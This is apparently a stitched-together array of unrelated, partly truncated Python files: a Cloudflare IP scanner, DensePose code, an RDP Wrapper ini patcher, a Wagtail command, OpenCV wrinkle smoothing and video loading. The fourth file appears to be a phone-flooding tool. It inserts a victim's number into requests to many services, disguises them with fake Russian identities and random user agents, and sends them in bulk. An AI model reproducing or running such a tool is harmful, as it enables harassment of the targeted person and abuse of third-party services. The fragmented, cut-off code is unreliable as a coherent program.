\u255a\u2550\u2550\u2550\u2550\u2550\u255d -      -\u255a\u2550\u255d\u255a\u2550\u255d     \r\n\"\"\"\r\n\r\n    for l in banner.split('\\n') :\r\n        split = l.split('-')\r\n        if len(split) > 1:\r\n            print(Colors.RED + split[0], Colors.WHITE + split[1], Colors.YELLOW + split[2] + Colors.RESET)\r\n\r\n    max_banner_lenght =  max(len(banner) for banner in banner.split('\\n'))\r\n    print(Colors.WHITE + \"\".ljust(max_banner_lenght, '\u2500'))\r\n    space = \"   \"#.ljust(int(max_banner_lenght / 4 ), ' ') \r\n    print (space + \"\u2022Author  : \" , \"! AZERTY9 !\" )\r\n    print (space + \"\u2022Github  : \" , \"https://github.com/az3rty9\" )\r\n    print (space + \"Telegram : \" , \"https://t.me/az3rty9\" ) \r\n    print (space + \"\u2022Version : \" , \"1.0\" )\r\n    \r\n    print(\"\".ljust(max_banner_lenght, '\u2500'))\r\n\r\n\r\ndef remove_duplicates(input_file):\r\n    with open(input_file, 'r') as file:\r\n        lines = file.read().split('\\n') #.readlines()\r\n        unique_urls = list(set(lines))#list(dict.fromkeys(lines))\r\n    return unique_urls       \r\n\r\n\r\ndef print_ascii_table(data):\r\n\r\n    max_country_len = max(len(country) for country in data.keys())\r\n    max_count_len = max(len(str(count)) for count in data.values())\r\n\r\n    if max_count_len < 5 :\r\n        max_count_len = max_count_len + (5 - max_count_len  )\r\n    if max_country_len < 7 :\r\n        max_country_len = max_country_len + (7 - max_country_len)\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n    print(f\"| {'Country':<{max_country_len}} | {'Count':<{max_count_len }} |\")\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\n    for country, count in data.items():\r\n        print(f\"| {country:<{max_country_len}} | { count:>{ max_count_len}} |\")\r\n\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\ndef create_ssl_connection(ip_addr, port, timeout):\r\n    sock = socket.create_connection((ip_addr, port), timeout=timeout)\r\n    context = ssl.create_default_context()\r\n    context.check_hostname = False\r\n    context.verify_mode = ssl.CERT_NONE\r\n    ssl_sock = context.wrap_socket(sock, server_hostname=request_url)\r\n    return ssl_sock\r\n\r\n\r\ndef test_ipaddress (ip_addr, port):\r\n    try:  \r\n        conn = None\r\n        if int(port) in [443,2053,2083,2087,2096,8443] :\r\n            conn = create_ssl_connection(ip_addr, port, timeout)\r\n        else:\r\n           conn = socket.create_connection((ip_addr, port), timeout=timeout)  \r\n           \r\n        #,context=ssl._create_unverified_context()\r\n        client = http.client.HTTPSConnection(request_url) if not enable_tls else http.client.HTTPSConnection(request_url)\r\n        client.sock = conn\r\n                        \r\n        start_time = time.time()\r\n        client.request(\"GET\", request_url_path,headers=headers)\r\n        response = client.getresponse()\r\n        tcp_duration = time.time() - start_time\r\n        body = response.read().decode(\"utf-8\")\r\n        #print(body)\r\n        #matches = dict(re.findall(r\"(\\w+)=(.+)\", body))\r\n        #if matches.get('ip') == ip_addr:\r\n        if f\"ip={ip_addr}\" in body : \r\n            latency = f\"{tcp_duration * 1000:.0f} ms\"\r\n            return latency#, matches\r\n        conn.close()\r\n        return None       \r\n    except Exception as e:\r\n        #print(f'{Colors.RED}[ERROR]{Colors",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n\nfrom typing import Dict\nimport torch\nfrom torch.nn import functional as F\n\nfrom detectron2.structures.boxes import Boxes, BoxMode\n\nfrom ..structures import (\n    DensePoseChartPredictorOutput,\n    DensePoseChartResult,\n    DensePoseChartResultWithConfidences,\n)\nfrom . import resample_fine_and_coarse_segm_to_bbox\nfrom .base import IntTupleBox, make_int_box\n\n\ndef resample_uv_tensors_to_bbox(\n    u: torch.Tensor,\n    v: torch.Tensor,\n    labels: torch.Tensor,\n    box_xywh_abs: IntTupleBox,\n) -> torch.Tensor:\n    \"\"\"\n    Resamples U and V coordinate estimates for the given bounding box\n\n    Args:\n        u (tensor [1, C, H, W] of float): U coordinates\n        v (tensor [1, C, H, W] of float): V coordinates\n        labels (tensor [H, W] of long): labels obtained by resampling segmentation\n            outputs for the given bounding box\n        box_xywh_abs (tuple of 4 int): bounding box that corresponds to predictor outputs\n    Return:\n       Resampled U and V coordinates - a tensor [2, H, W] of float\n    \"\"\"\n    x, y, w, h = box_xywh_abs\n    w = max(int(w), 1)\n    h = max(int(h), 1)\n    u_bbox = F.interpolate(u, (h, w), mode=\"bilinear\", align_corners=False)\n    v_bbox = F.interpolate(v, (h, w), mode=\"bilinear\", align_corners=False)\n    uv = torch.zeros([2, h, w], dtype=torch.float32, device=u.device)\n    for part_id in range(1, u_bbox.size(1)):\n        uv[0][labels == part_id] = u_bbox[0, part_id][labels == part_id]\n        uv[1][labels == part_id] = v_bbox[0, part_id][labels == part_id]\n    return uv\n\n\ndef resample_uv_to_bbox(\n    predictor_output: DensePoseChartPredictorOutput,\n    labels: torch.Tensor,\n    box_xywh_abs: IntTupleBox,\n) -> torch.Tensor:\n    \"\"\"\n    Resamples U and V coordinate estimates for the given bounding box\n\n    Args:\n        predictor_output (DensePoseChartPredictorOutput): DensePose predictor\n            output to be resampled\n        labels (tensor [H, W] of long): labels obtained by resampling segmentation\n            outputs for the given bounding box\n        box_xywh_abs (tuple of 4 int): bounding box that corresponds to predictor outputs\n    Return:\n       Resampled U and V coordinates - a tensor [2, H, W] of float\n    \"\"\"\n    return resample_uv_tensors_to_bbox(\n        predictor_output.u,\n        predictor_output.v,\n        labels,\n        box_xywh_abs,\n    )\n\n\ndef densepose_chart_predictor_output_to_result(\n    predictor_output: DensePoseChartPredictorOutput, boxes: Boxes\n) -> DensePoseChartResult:\n    \"\"\"\n    Convert densepose chart predictor outputs to results\n\n    Args:\n        predictor_output (DensePoseChartPredictorOutput): DensePose predictor\n            output to be converted to results, must contain only 1 output\n        boxes (Boxes): bounding box that corresponds to the predictor output,\n            must contain only 1 bounding box\n    Return:\n       DensePose chart-based result (DensePoseChartResult)\n    \"\"\"\n    assert len(predictor_output) == 1 and len(boxes) == 1, (\n        f\"Predictor output to result conversion can operate only single outputs\"\n        f\", got {len(predictor_output)} predictor outputs and {len(boxes)} boxes\"\n    )\n\n    boxes_xyxy_abs = boxes.tensor.clone()\n    boxes_xywh_abs = BoxMode.convert(boxes_xyxy_abs, BoxMode.XYXY_ABS, BoxMode.XYWH_ABS)\n    box_xywh = make_int_box(boxes_xywh_abs[0])\n\n    labels = resample_fine_and_coarse_segm_to_bbox(predictor_output, box_xywh).squeeze(0)\n    uv = resample_uv_to_bbox(predictor_output, labels, box_xywh)\n    return DensePoseChartResult(labels=labels, uv=uv)\n\n\ndef resample_confidences_to_bbox(\n    predictor_output: DensePoseChartPredictorOutput,\n    labels: torch.Tensor,\n    box_xywh_abs: IntTupleBox,\n) -> Dict[str, torch.Tensor]:\n    \"\"\"\n    Resamples confidences for the given bounding box\n\n    Args:\n        predictor_output (DensePoseChartPredictorOutput): DensePose predictor\n            output to be resampled\n        labels (tensor [H, W] of long): labels obtained by resampling segmentation\n            outputs for the given bounding box\n        box_xywh_abs (tuple of 4 int): bounding box that corresponds to predictor outputs\n    Return:\n       Resampled confidences - a dict of [H, W] tensors of float\n    \"\"\"\n\n    x, y, w, h = box_xywh_abs\n    w = max(int(w), 1)\n    h = max(int(h), 1)\n\n    confidence_names = [\n        \"sigma_1\",\n        \"sigma_2\",\n        \"kappa_u\",\n        \"kappa_v\",\n        \"fine_segm_confidence\",\n        \"coarse_segm_confidence\",\n    ]\n    confidence_results = {key: None for key in confidence_names}\n    confidence_names = [\n        key for key in confidence_names if getattr(predictor_output, key) is not None\n    ]\n    confidence_base = torch.zeros([h, w], dtype=torch.float32, device=predictor_output.u.device)\n\n    # assign data from channels that correspond to the labels\n    for key in confidence_names:\n        resampled_confidence = F.interpolate(\n            getattr(predictor_output, key),\n            (h, w),\n            mode=\"bilinear\"",
    "import sys\nimport ctypes, os\n\n\ndef check_administrator() -> bool:\n    \"\"\"\n    Check if the program has administrator rights.\n    \"\"\"\n    try:\n        is_admin = os.getuid() == 0\n    except AttributeError:\n        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n    return is_admin\n\ndef read_file(path: str) -> str:\n    \"\"\"\n    Reads the offsets.txt file provided and returns its contents.\n\n    Args:\n        path: Path of offsets.txt\n    \n    Returns:\n        contents of offsets.txt\n    \"\"\"\n    print(path)\n    try:\n        with open(path, 'r') as file:\n            contents = file.read()\n            if contents == None or contents == \"\\n\":\n                print(\"\\033[91moffsets.txt was found but is empty... \\\nHave you run autofinder.bat yet?\\033[0m\")\n    except FileNotFoundError:\n        print(\"\\033[91moffsets.txt was not found. Is the path set correctly?\\\n\\033[0m\")\n        raise FileNotFoundError\n\n    return contents\n\ndef disable_rdp_service() -> None:\n    \"\"\"\n    Stops Remote Desktop Services so that rdpwrap.ini can be modified.\n    \"\"\"\n    os.system(f'net stop \"Remote Desktop Services\"')\n\ndef enable_rdp_service() -> None:\n    \"\"\"\n    Starts Remote Desktop Services so that RDP will work again.\n    \"\"\"\n    os.system(f'net start \"Remote Desktop Services\"')\n\n\ndef modify_rdpwrap(offsets) -> None:\n    \"\"\"\n    Modifies rdpwrap.ini with the new offsets in offsets.txt\n\n    Args:\n        offsets: Offsets from offsets.txt\n    \"\"\"\n    with open('C:\\\\Program Files\\\\RDP Wrapper\\\\rdpwrap.ini', 'r+') as file:\n        original_contents = file.read()\n\n        sections = original_contents.split(\"\\n\\n\")\n        \n        start_section = sections[:4]\n        win_version_specifics = sections[4:]\n\n        \n        non_slint = [x for x in win_version_specifics if '-SLInit' not in x]\n        slint = [x for x in win_version_specifics if '-SLInit' in x]\n        \"\"\"\n        print(start_section)\n        print(\"\\n\"*10)\n        print(non_slint)\n        print(\"\\n\"*10)\n        print(slint)\n        print(\"\\n\"*10)\n        \"\"\"\n\n        non_slint_new, slint_new = offsets.split(\"\\n\\n\")\n        non_slint_new_ver = non_slint_new[1:].split(']')[0].split('.')\n        slint_new_ver = slint_new[1:].split('-')[0].split('.')\n\n        for index, version in enumerate(non_slint):\n            version_split = version[1:].split(']')[0].split('.')\n            if(len(version_split) != 4):\n                continue\n            if (int(non_slint_new_ver[0]) <= int(version_split[0])\n                and int(non_slint_new_ver[1]) <= int(version_split[1])\n                and int(non_slint_new_ver[2]) <= int(version_split[2])\n                and int(non_slint_new_ver[3]) <= int(version_split[3])):\n                if version_split == non_slint_new_ver:\n                    print(\"\\033[91mYour rdpwrap.ini already includes the new Non-SLInit offsets\\033[0m\")\n                    print(f\"\\033[91mThe offset verson was {non_slint_new_ver}\\033[0m\")\n                    break\n                non_slint.insert(index, non_slint_new)\n                print(f\"{version_split} was found, inserting before it.\")\n                print(f\"Inserted {non_slint_new}\")\n                break\n\n        print(\"\\n\")\n\n        for index, version in enumerate(slint[1:]):\n            version_split = version[1:].split('-')[0].split('.')\n            if(len(version_split) != 4):\n                continue\n            if (int(slint_new_ver[0]) <= int(version_split[0])\n                and int(slint_new_ver[1]) <= int(version_split[1])\n                and int(slint_new_ver[2]) <= int(version_split[2])\n                and int(slint_new_ver[3]) <= int(version_split[3])):\n                if version_split == slint_new_ver:\n                    print(\"\\033[91mYour rdpwrap.ini already includes the new SLInit offsets\\033[0m\")\n                    print(f\"\\033[91mThe offset verson was {slint_new_ver}\\033[0m\")\n                    break\n                slint.insert(index + 1, slint_new)\n                print(f\"{version_split} was found, inserting before it.\")\n                print(f\"Inserted {slint_new}\")\n                break\n        \n        file.seek(0)\n        file.write(\"\\n\\n\".join(start_section) + \"\\n\\n\" + \"\\n\\n\".join(non_slint) \n                   + \"\\n\\n\" + \"\\n\\n\".join(slint))\n\ndef main():\n    \"\"\"\n    Main function.\n    \"\"\"\n    if not check_administrator():\n        print(\"\\033[91mThe executable is not being run with administrator \\\nrights.\\033[0m\")\n        print(\"\\033[91mHere's some things to check:\\033[0m\")\n        print(\"\\033[91mDid you remember to run as administrator?\\033[0m\")\n        print(\"\\033[91mIs some antivirus enabled?\\033[0m\")\n        raise PermissionError\n    for arg in sys.argv:\n        print(arg)\n\n    path = os.getcwd()\n    parent = os.path.dirname(path)\n    contents = read_file(parent + \"\\offsets.txt\")\n\n    disable_rdp_service()\n\n    modify_rdpwrap(contents)\n\n    enable_rdp_service()\n\n\n\nif __name__ == \"__main__\":\n    main()",
    "import argparse\nimport json\nimport jsoneditor\nimport logging\nimport random\nimport re\nimport requests\nimport string\nfrom dataclasses import dataclass\nfrom fake_useragent import UserAgent\nfrom pprint import pprint\n\nua = UserAgent()\n\nlogging.basicConfig(\n    level=logging.DEBUG,\n    format='%(levelname)s: %(message)s'\n)\n\nphone_pattern_legacy = re.compile(r'\\{formatted_phone:(.*)}')\nphone_pattern = re.compile(r'\\{phone:([^}]*)}')\n\n\n@dataclass\nclass Phone:\n    country_code: str\n    phone: str\n\n    def __str__(self):\n        return self.country_code + self.phone\n\n\n@dataclass\nclass FakeData:\n    first_name: str\n    last_name: str\n    password: str\n    email: str\n    username: str\n\n\ndef generate_fake_data():\n    first_name = random.choice([\"\u041c\u0430\u0440\u0438\u044f\", \"\u0410\u043d\u043d\u0430\", \"\u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0430\", \"\u0421\u0432\u0435\u0442\u043b\u0430\u043d\u0430\", \"\u0418\u0440\u0438\u043d\u0430\", \"\u041e\u043b\u044c\u0433\u0430\"])\n    last_name = random.choice([\"\u0418\u0432\u0430\u043d\u043e\u0432\u0430\", \"\u041f\u0435\u0442\u0440\u043e\u0432\u0430\", \"\u0421\u043c\u0438\u0440\u043d\u043e\u0432\u0430\", \"\u041a\u0443\u0437\u043d\u0435\u0446\u043e\u0432\u0430\", \"\u0421\u043e\u043a\u043e\u043b\u043e\u0432\u0430\", \"\u041f\u043e\u043f\u043e\u0432\u0430\"])\n    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))\n    email = f\"{first_name.lower()}.{last_name.lower()}@{random.choice(['mail.ru', 'yandex.ru', 'gmail.com'])}\"\n    username = first_name.lower() + str(random.randint(100, 999))\n    return FakeData(first_name, last_name, password, email, username)\n\n\nfake_data = generate_fake_data()\n\nlogging.debug(\"Fake data: %s\", fake_data)\n\n\ndef format_phone(phone, mask):\n    formatted_phone = []\n    phone_index = 0\n    for symbol in mask:\n        if phone_index < len(phone):\n            if symbol == '*':\n                formatted_phone.append(phone[phone_index])\n                phone_index += 1\n            else:\n                formatted_phone.append(symbol)\n    return ''.join(formatted_phone)\n\n\ndef format_by_pattern(input_string, phone):\n    new_string = input_string\n\n    match_legacy = phone_pattern_legacy.search(input_string)\n    if match_legacy:\n        new_string = new_string.replace(\n            match_legacy.group(),\n            format_phone(str(phone), match_legacy.group(1))\n        )\n\n    match = phone_pattern.search(input_string)\n    if match:\n        new_string = new_string.replace(\n            match.group(),\n            format_phone(phone.phone, match.group(1))\n        )\n\n    replacements = {\n        \"full_phone\": str(phone),\n        \"phone\": phone.phone,\n        \"first_name\": fake_data.first_name,\n        \"last_name\": fake_data.last_name,\n        \"password\": fake_data.password,\n        \"email\": fake_data.email,\n        \"username\": fake_data.username\n    }\n\n    for key, value in replacements.items():\n        new_string = new_string.replace(\"{\" + key + \"}\", str(value))\n\n    return new_string\n\n\ndef process_request(request, phone):\n    url = format_by_pattern(request[\"url\"], phone)\n    logging.info(\"URL: %s\", url)\n\n    method = request.get(\"method\", \"POST\").upper()\n    logging.info(\"Method: %s\", method)\n\n    params = {\n        \"url\": url,\n        \"method\": method,\n        \"headers\": {\"User-Agent\": ua.random}\n    }\n\n    if \"headers\" in request:\n        for k, v in request[\"headers\"].items():\n            formatted_key = format_by_pattern(k, phone)\n            formatted_value = format_by_pattern(v, phone)\n            params[\"headers\"][formatted_key] = formatted_value\n\n        logging.info(\"Headers: %s\", params[\"headers\"])\n\n    if \"json\" in request:\n        json_body = format_by_pattern(\n            json.dumps(request[\"json\"]) if isinstance(request[\"json\"], dict) else request[\"json\"], phone)\n\n        try:\n            json.loads(json_body)\n        except Exception as e:\n            logging.warning(\"INVALID JSON BODY: %s, Error: %s\", json_body, str(e))\n\n        logging.debug(\"JSON Body: %s\", json_body)\n\n        params[\"json\"] = json.loads(json_body)\n\n    if \"params\" in request:\n        url_params = {\n            k: format_by_pattern(v, phone)\n            for k, v in request[\"params\"].items()\n        }\n\n        logging.debug(\"Params: %s\", url_params)\n\n        params[\"params\"] = url_params\n\n    if \"data\" in request:\n        form_data = {\n            format_by_pattern(k, phone): format_by_pattern(v, phone)\n            for k, v in request[\"data\"].items()\n        }\n\n        logging.debug(\"Form data Body: %s\", form_data)\n\n        params[\"data\"] = form_data\n\n    logging.debug(\"Sending request with params: %s\", params)\n\n    try:\n        response = requests.request(**params)\n        try:\n            pprint(response.json())\n        except json.JSONDecodeError:\n            print(response.text)\n    except requests.RequestException as e:\n        logging.error(\"Request failed: %s\", str(e))\n\n\ndef process_service(service, phone):\n    if \"requests\" in service:\n        for index, request in enumerate(service[\"requests\"]):\n            logging.info(\"Request #%s\", index)\n            process_request(request, phone)\n    else:\n        process_request(service, phone)\n\n\ndef process_services(services, phone):\n    if isinstance(services, list):\n        for index, service in enumerate(services):\n            logging.info(\"Service #%s\", index)\n            process_service(service, phon",
    "from django.core.management.base import BaseCommand\nfrom django.core.management.color import color_style, supports_color\nfrom wagtail_fedit.registry import registry as adapter_registry\nfrom wagtail_fedit.utils import TEMPLATE_TAG_NAME\nfrom wagtail_fedit.settings import SHARE_WITH_SESSIONS\n\n\nclass Command(BaseCommand):\n    help = \"Print an example of how to use all registered adapters.\"\n\n    def handle(self, *args, **options):\n        LB = \"\\n\"\n\n        s = [\n            \"Registered Adapters\",\n            \"====================\",\n            \" * The first argument is the identifier of the adapter.\",\n            \" * The second argument is the model and/or field to edit. instance.modelfield or instance\",\n            \" * Arguments prefixed with a exclamation mark are absolute. These act like flags.\",\n            \" * Arguments prefixed with a question mark are optional.\",\n        ]\n\n        if SHARE_WITH_SESSIONS:\n            s.extend([\n                \" * Context is shared with Django sessions. This is useful if you are running into limits with the URL length.\",\n                \"   This will store the session key as a URL parameter and the shared context in the session.\",\n            ])\n        else:\n            s.extend([\n                \" * Extra keyword arguments are optional; must be serializable to JSON and should not be too complex.\",\n                \"   This is due to limits in URL-size when sharing context between views.\",\n            ])\n\n        s.extend([\n            \" * You can specify 'as varname' as the last arguments to the templatetag to store the adapter HTML in a context variable.\",\n        ])\n\n        for identifier, adapter_class in adapter_registry.adapters.items():\n\n            s.append(\n                \"==========\",\n            )\n\n            s.append(\n                \"\"\n            )\n\n            DISTANCE = \"    \"\n\n            getter = \"instance\"\n            if adapter_class.field_required:\n                getter += \".modelfield\"\n\n            s.append(\n                f\"{DISTANCE}{{% {TEMPLATE_TAG_NAME} {identifier} {getter} {adapter_class.get_usage_string()} %}}\",\n            )\n\n            HELP_DISTANCE = DISTANCE + \"  \"\n            description = adapter_class.get_usage_description()\n            if description:\n                s.append(\n                    f\"{HELP_DISTANCE}{description}\",\n                )\n                \n            help_text = adapter_class.get_usage_help_text()\n            if help_text:\n                mid = f\"{HELP_DISTANCE} * \"\n                help_text = f\"{LB}{mid}\".join([\n                    f\"{k}: {v}\" for k, v in help_text.items()\n                ])\n                s.append(\n                    f\"{mid}{help_text}\",\n                )\n\n            s.append(\"\")\n\n        if supports_color():\n            style = color_style()\n            s = style.SUCCESS(LB.join(s))\n        else:\n            s = LB.join(s)\n        self.stdout.write(LB)\n        self.stdout.write(s)\n        self.stdout.write(LB)\n\n\n",
    "import cv2\r\nimport numpy as np\r\n\r\n# \u52a0\u8f7d\u56fe\u50cf\u5e76\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\r\nimage = cv2.imread('1.webp')\r\ngray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\nimage_orignal = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\n\r\n# \u52a0\u8f7d\u4eba\u8138\u548c\u773c\u775b\u68c0\u6d4b\u5668\u6a21\u578b\r\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\r\neye_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_eye.xml')\r\n\r\n# \u68c0\u6d4b\u4eba\u8138\r\nfaces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)\r\n\r\n# \u5982\u679c\u68c0\u6d4b\u5230\u4e86\u4eba\u8138\r\nif len(faces) > 0:\r\n    for (fx, fy, fw, fh) in faces:\r\n        # \u5728\u4eba\u8138\u533a\u57df\u5185\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n        face_roi = gray[fy:fy+int(3*fh/5), fx+int(2*fw/11):fx+int(9*fw/11)]\r\n\r\n        # \u52a0\u8f7d\u773c\u775b\u68c0\u6d4b\u5668\u6a21\u578b\r\n        eyes = eye_cascade.detectMultiScale(face_roi, scaleFactor=1.1, minNeighbors=5)\r\n\r\n        # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\u5e76\u83b7\u53d6\u773c\u775b\u548c\u5634\u5df4\u68c0\u6d4b\u533a\u57df\r\n        wrinkle_region = np.ones_like(face_roi) * 255\r\n        for (ex, ey, ew, eh) in eyes:\r\n            # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\uff08\u773c\u775b\u4e0a\u65b9\uff09\r\n            cv2.rectangle(wrinkle_region, (ex, ey + int(6 * eh / 9)), (ex + ew, ey - int(3 * eh / 9)), (0, 0, 0), -1)\r\n\r\n        # \u4f7f\u7528Sobel\u7b97\u5b50\u8fdb\u884c\u8fb9\u7f18\u68c0\u6d4b\r\n        sobel_x = cv2.Sobel(face_roi, cv2.CV_64F, 1, 0, ksize=3)\r\n        sobel_y = cv2.Sobel(face_roi, cv2.CV_64F, 0, 1, ksize=3)\r\n        gradient_magnitude = np.sqrt(sobel_x**2 + sobel_y**2)\r\n\r\n        # Sobel\u8fb9\u7f18\u56fe\u50cf\r\n        wrinkle_image = np.uint8(gradient_magnitude > 100) * 255\r\n\r\n        # \u5728\u76b1\u7eb9\u68c0\u6d4b\u533a\u57df\u4e4b\u5916\u540c\u65f6\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n        wrinkle_image = cv2.bitwise_and(wrinkle_image, wrinkle_region)\r\n\r\n        # \u5bfb\u627e\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\u7684\u8f6e\u5ed3\r\n        contours, _ = cv2.findContours(wrinkle_image, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n        # \u5728\u539f\u56fe\u4e0a\u7ed8\u5236\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\r\n        for contour in contours:\r\n            x, y, w, h = cv2.boundingRect(contour)\r\n            #cv2.rectangle(face_roi, (x, y), (x + w, y + h), (0, 255, 0), 2)\r\n            # \u5bf9\u76b1\u7eb9\u533a\u57df\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\r\n            face_roi[y:y+h, x:x+w] = cv2.GaussianBlur(face_roi[y:y+h, x:x+w], (21, 21), 0)\r\n        # \u5c06\u5904\u7406\u540e\u7684\u4eba\u8138\u533a\u57df\u653e\u56de\u539f\u56fe\u4e2d\r\n        gray[fy:fy+int(3*fh/5), fx+int(2*fw/11):fx+int(9*fw/11)] = face_roi\r\nelse:\r\n    # \u5982\u679c\u672a\u68c0\u6d4b\u5230\u4eba\u8138\uff0c\u5219\u5728\u6574\u4e2a\u56fe\u50cf\u533a\u57df\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n    # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\u5e76\u83b7\u53d6\u773c\u775b\u68c0\u6d4b\u533a\u57df\r\n    wrinkle_region = np.ones_like(gray) * 255\r\n    eyes = eye_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)\r\n    for (ex, ey, ew, eh) in eyes:\r\n        # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\uff08\u773c\u775b\u4e0a\u65b9\uff09\r\n        cv2.rectangle(wrinkle_region, (ex, ey + int(6 * eh / 9)), (ex + ew, ey - int(3 * eh / 9)), (0, 0, 0), -1)\r\n\r\n    # \u4f7f\u7528Sobel\u7b97\u5b50\u8fdb\u884c\u8fb9\u7f18\u68c0\u6d4b\r\n    sobel_x = cv2.Sobel(gray, cv2.CV_64F, 1, 0, ksize=3)\r\n    sobel_y = cv2.Sobel(gray, cv2.CV_64F, 0, 1, ksize=3)\r\n    gradient_magnitude = np.sqrt(sobel_x**2 + sobel_y**2)\r\n\r\n    # Sobel\u8fb9\u7f18\u56fe\u50cf\r\n    wrinkle_image = np.uint8(gradient_magnitude > 150) * 255\r\n\r\n    # \u5728\u773c\u775b\u4e4b\u5916\u540c\u65f6\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n    wrinkle_image = cv2.bitwise_and(wrinkle_image, wrinkle_region)\r\n\r\n    # \u5bfb\u627e\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\u7684\u8f6e\u5ed3\r\n    contours, _ = cv2.findContours(wrinkle_image, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n    # \u5728\u539f\u56fe\u4e0a\u7ed8\u5236\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\r\n    for contour in contours:\r\n        x, y, w, h = cv2.boundingRect(contour)\r\n        # \u5bf9\u76b1\u7eb9\u533a\u57df\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\r\n        cv2.rectangle(gray, (x, y), (x + w, y + h), (0, 255, 0), 2)\r\n        gray[y:y+h, x:x+w] = cv2.GaussianBlur(gray[y:y+h, x:x+w], (15, 15), 0)\r\n\r\n# \u663e\u793a\u7ed3\u679c\u56fe\u50cf\r\ncv2.imshow('image', image_orignal)\r\ncv2.imshow('Wrinkle Detection', gray)\r\ncv2.waitKey(0)\r\ncv2.destroyAllWindows()\r\n\r\n",
    "# -*- coding: utf-8 -*-\n# @Time    : 2024/4/6 12:02\n# @Author  : yesliu\n# @File    : video_preprocess.py\n\nimport os\nimport json\nfrom pathlib import Path\nfrom typing import Tuple, Union\n\nimport numpy as np\nimport torch\nimport random\nfrom PIL import Image, ImageSequence\nfrom decord import VideoReader\n\n\ndef load_video(video_path: Union[str, Path], num_frames: int = 16, return_tensor: bool = True,\n               sample: str = \"middle\") -> Union[np.ndarray, torch.Tensor]:\n    \"\"\"\n    Load a video from a given path, change its fps and resolution if needed\n    :param video_path (str): The video file path to be loaded.\n    :param num_frames (int): The number of frames to be loaded\n    :param return_tensor (bool): return torch tensor if True\n    :param sample: frame sample method\n    :return frames (np.ndarray):\n    \"\"\"\n    if isinstance(video_path, Path):\n        video_path = str(video_path.resolve())\n\n    if video_path.endswith('.gif'):\n        frame_ls = []\n        img = Image.open(video_path)\n        for frame in ImageSequence.Iterator(img):\n            frame = frame.convert('RGB')\n            frame = np.array(frame).astype(np.uint8)\n            frame_ls.append(frame)\n        buffer = np.array(frame_ls).astype(np.uint8)\n    elif video_path.endswith('.mp4') or video_path.endswith('.avi'):\n        import decord\n        decord.bridge.set_bridge('native')\n        video_reader = VideoReader(video_path)\n        frames = video_reader.get_batch(range(len(video_reader)))  # (T, H, W, C), torch.uint8\n        buffer = frames.asnumpy().astype(np.uint8)\n    else:\n        raise NotImplementedError(\"Video format Not implemented yet\")\n\n    frames = buffer\n    if num_frames:\n        frame_indices = get_frame_indices(\n            num_frames, len(frames), sample=sample\n        )\n        frames = frames[frame_indices]\n\n    if return_tensor:\n        frames = torch.Tensor(frames)\n        frames = frames.permute(0, 3, 1, 2)  # (T, C, H, W), torch.uint8\n\n    return frames\n\n\ndef get_frame_indices(num_frames, vlen, sample='random', fix_start=None):\n    \"\"\"\n    sample sequence frames from video\n    :param num_frames: number of frames to sample\n    :param vlen: total video length\n    :param sample: sample method, either 'rand' or 'middle'\n    :param fix_start: start frame\n    :return: frames starting from fix_start, random or middle frames\n    \"\"\"\n    assert num_frames <= vlen\n    if sample in [\"random\", \"middle\", \"start\"]:\n        if sample == \"random\":\n            intervals = range(0, vlen - num_frames + 1, num_frames)\n            start = random.choice(intervals)\n        elif sample == \"middle\":\n            start = vlen // 2 - 1\n        elif sample == \"start\":\n            start = 0\n        else:\n            raise NotImplementedError(\"no such sample method\")\n        frame_indices = [start + i for i in range(num_frames)]\n    elif fix_start is not None:\n        assert fix_start + num_frames <= vlen, \"fix start frame must be less than vlen - num_frames\"\n        frame_indices = [fix_start + i for i in range(num_frames)]\n    else:\n        raise ValueError\n    return frame_indices\n",
